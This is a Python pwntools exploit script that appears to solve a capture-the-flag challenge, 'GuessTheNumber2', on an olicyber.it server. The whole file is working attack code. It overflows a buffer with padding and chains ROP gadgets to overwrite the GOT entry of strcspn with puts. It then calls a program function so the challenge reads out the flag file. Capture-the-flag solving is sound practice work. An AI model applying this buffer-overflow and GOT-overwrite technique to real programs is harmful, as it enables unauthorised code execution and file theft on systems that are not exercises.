from pwn import *

elf = ELF('./GuessTheNumber2')

if args.REMOTE:
    r = remote('gtn2.challs.olicyber.it', 10023)
else:
    r = gdb.debug('./GuessTheNumber2', '''b main''')

print(r.recvuntil(b'scores:'))
r.sendline(b'\x00'*36 + 
           p64(0x401803)+ #pop rdi; ret
           p64(elf.got['strcspn'])+ #strcspn
           p64(elf.sym['gets'])+
           p64(0x401803)+ #pop rdi; ret
           p64(0x404088)+ #address of the string in the .data section
           p64(elf.sym['gets'])+ #gets, puts the result in rax
           p64(0x401803)+ #pop rdi; ret
           p64(0x404088)+ #address of the string in the .data section
           p64(elf.sym['gets'])+ #gets, puts the result in rax
           p64(0x401803)+ #pop rdi; ret
           p64(0x404088)+ #address of the string in the .data section
           p64(0x401487)) #call printScores

print(r.recvuntil(b'Secondary file').decode())
print('-- sending 0')
r.sendline(b'0')
print(r.recvuntil(b':(').decode())
print('-- sending puts address')
r.sendline(p64(elf.sym['puts']))
print(r.recvuntil(b':(').decode())

if args.REMOTE: r.sendline(b'flag')
else: r.sendline(b'flag.txt')

r.recvuntil(b'lag')
print('flag' + r.recvline().decode()[:-2])